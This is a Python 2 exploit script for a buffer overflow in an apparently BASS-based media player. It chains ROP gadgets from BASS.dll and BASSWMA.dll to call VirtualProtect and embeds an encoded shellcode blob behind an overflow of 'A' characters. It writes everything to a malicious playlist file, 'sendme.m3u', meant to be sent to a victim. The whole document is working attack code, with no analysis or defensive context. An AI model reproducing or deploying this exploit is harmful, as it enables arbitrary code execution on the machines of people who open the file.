import struct
from time import sleep

def generate_rop():
    rop_chain = [

        0x1001d748, # POP EBP - RET
        0x1001d748, # POP EBP - RET
        0x10015f82, # POP EAX - RET
        0xFFFFFCF0, # Value to negate --> 310
        0x10014db4, # NEG EAX - RET
        0x10032F72, # XCHG EAX, EBX - RET
        0x10015f82, # POP EAX - RET
        0xFFFFFFC0, # Value to negate --> 40
        0x10014db4, # NEG EAX, RET
        0x10038a6c, # XCHG EAX, EDX - RET
        0x10601007, # POP ECX - RET
        0X10108002, # BASSWMA.dll writable location --> lpFoldProtect

        0x10603658, # POP EDI - RET
        0x1004041D, # RET
        0x10010407, # POP ESI, RETN
        0x1001F83B, # JMP DWORD PTR DS:[EAX]
        0x10015f82, # POP EAX - RET
        0x10109270, # ptr to VirtualProtect()
        0x1001d7a5, # PUSHAD - RET
        0x100222C5 # JMP ESP

        ]

    chain = []
    for gadget in rop_chain:
        gad = struct.pack("<I", gadget)
        chain.append(gad)
    return "".join(chain)


def main():

    rop_chain = generate_rop()
    shellcode = "\x90"*40
    shellcode += "\xb8\x4a\xc7\x3a\x9b\xd9\xc3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
    shellcode += "\x31\x83\xc2\x04\x31\x42\x0f\x03\x42\x45\x25\xcf\x67\xb1\x2b"
    shellcode += "\x30\x98\x41\x4c\xb8\x7d\x70\x4c\xde\xf6\x22\x7c\x94\x5b\xce"
    shellcode += "\xf7\xf8\x4f\x45\x75\xd5\x60\xee\x30\x03\x4e\xef\x69\x77\xd1"
    shellcode += "\x73\x70\xa4\x31\x4a\xbb\xb9\x30\x8b\xa6\x30\x60\x44\xac\xe7"
    shellcode += "\x95\xe1\xf8\x3b\x1d\xb9\xed\x3b\xc2\x09\x0f\x6d\x55\x02\x56"
    shellcode += "\xad\x57\xc7\xe2\xe4\x4f\x04\xce\xbf\xe4\xfe\xa4\x41\x2d\xcf"
    shellcode += "\x45\xed\x10\xe0\xb7\xef\x55\xc6\x27\x9a\xaf\x35\xd5\x9d\x6b"
    shellcode += "\x44\x01\x2b\x68\xee\xc2\x8b\x54\x0f\x06\x4d\x1e\x03\xe3\x19"
    shellcode += "\x78\x07\xf2\xce\xf2\x33\x7f\xf1\xd4\xb2\x3b\xd6\xf0\x9f\x98"
    shellcode += "\x77\xa0\x45\x4e\x87\xb2\x26\x2f\x2d\xb8\xca\x24\x5c\xe3\x80"
    shellcode += "\xbb\xd2\x99\xe6\xbc\xec\xa1\x56\xd5\xdd\x2a\x39\xa2\xe1\xf8"
    shellcode += "\x7e\x5c\xa8\xa1\xd6\xf5\x75\x30\x6b\x98\x85\xee\xaf\xa5\x05"
    shellcode += "\x1b\x4f\x52\x15\x6e\x4a\x1e\x91\x82\x26\x0f\x74\xa5\x95\x30"
    shellcode += "\x5d\xc6\x78\xa3\x3d\x27\x1f\x43\xa7\x37"

    payload = "http://"
    payload += "A"*1005
    payload += "\x1d\x04\x04\x10"           # 0x1004041D - ret (BASS.dll)
    payload += rop_chain
    payload += shellcode
    payload += "\x90"*(2500-len(payload))

    print "[+] Dropping payload..."
    sleep(2)
    f = open("sendme.m3u", "w")
    f.write(payload)
    f.close

if __name__ == "__main__":
    main()
    
